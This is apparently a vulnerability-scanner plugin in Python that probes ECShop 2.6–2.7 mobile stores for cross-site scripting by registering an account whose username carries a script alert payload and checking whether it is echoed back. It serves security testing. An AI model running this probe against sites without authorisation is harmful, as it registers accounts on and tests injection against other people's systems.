#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'network'
"""
POC Name  :  ecshop xss漏洞 2.6-2.7（开启手机商城的）
"""


def assign(service, arg):
    if service == "ecshop":
        return True, arg

def audit(arg):
    url = arg
    url = url + '/mobile/user.php?act=act_register'
    post_data = 'username=networks<script>alert(123456)</script>&email=xsstest@126.com&password=woaini&confirm_password=woaini&act=act_register&back_act='
    code, head, body, _, _ = curl.curl("-d \"%s\" %s" %(post_data,url))
    if code == 200:
        if body and body.find('<script>alert(123456)</script>') != -1:
            security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('ecshop', 'http://www.example.com/')[1])